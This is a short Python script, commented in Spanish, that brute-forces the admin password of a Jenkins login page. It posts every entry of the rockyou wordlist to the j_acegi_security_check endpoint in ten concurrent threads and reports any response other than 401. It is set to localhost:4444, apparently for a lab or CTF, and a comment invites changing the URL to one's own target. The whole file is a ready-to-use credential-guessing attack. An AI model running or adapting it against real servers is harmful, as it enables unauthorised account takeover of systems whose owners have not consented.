import requests
from concurrent.futures import ThreadPoolExecutor

#url debe ser modificada por la url en su caso del jenkins junto con Referer y Origin
url = 'http://localhost:4444/j_acegi_security_check'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://localhost:4444',
    'Connection': 'close',
    'Referer': 'http://localhost:4444/login?from=%2F',
    'Cookie': 'JSESSIONID.d9b580bc=node02ykvyy12a4051h9vgdatgm3bc0.node0; JSESSIONID.380eaba9=node0sqq2t75g1t151c2ox5kvpzi530.node0',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1'
}

# Definir la ruta del archivo
archivo = '/usr/share/wordlists/rockyou.txt'

# Variable booleana para indicar si se encontró la contraseña
contrasena_encontrada = False

# Función para enviar la solicitud POST y verificar la respuesta
def check_password(password):
    global contrasena_encontrada
    if not contrasena_encontrada:
        data = {
            'j_username': 'admin',
            'j_password': password.strip(),
            'from': '%2F',
            'Submit': 'Sign+in'
        }
        response = requests.post(url, headers=headers, data=data)
        print(f"Para '{password.strip()}': {response.status_code}")
        if response.status_code != 401:
            print(f"Contraseña encontrada: {password.strip()}")
            contrasena_encontrada = True

# Usar ThreadPoolExecutor para enviar solicitudes concurrentemente
with ThreadPoolExecutor(max_workers=10) as executor:
    for line in open(archivo, 'r'):
        executor.submit(check_password, line)
        if contrasena_encontrada:
            break
